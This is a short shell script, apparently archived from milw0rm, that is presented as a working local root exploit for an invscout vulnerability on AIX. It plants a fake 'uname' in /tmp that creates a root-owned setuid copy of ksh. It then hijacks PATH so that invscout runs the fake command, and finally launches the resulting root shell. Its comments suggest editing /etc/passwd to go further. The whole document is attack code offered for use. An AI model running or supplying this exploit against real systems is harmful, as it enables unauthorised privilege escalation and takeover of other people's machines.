#!/usr/bin/sh
# r00t exploit written for the invscout bug reported by Idefense labs
# http://www.idefense.com/application/poi/display?id=171&type=vulnerabilities
# coded by ri0t exploitation is trivial but automated with this script
# www.ri0tnet.net
#
# usage ./getr00t.sh :)
# exploitation gives euid(root) from here getting guid (root) is as simple as an
# /etc/passwd edit


cd /tmp
echo '/usr/bin/cp /usr/bin/ksh ./' > uname
echo '/usr/bin/chown root:system ./ksh' >> uname
echo '/usr/bin/chmod 777 ./ksh' >> uname
echo '/usr/bin/chmod +s ./ksh' >> uname
/usr/bin/chmod 777 uname
PATH=./
export PATH
/usr/sbin/invscout
PATH="/usr/bin:/usr/sbin:/usr/local/bin:/bin:./"
export PATH
exec /tmp/ksh

# milw0rm.com [2005-03-25]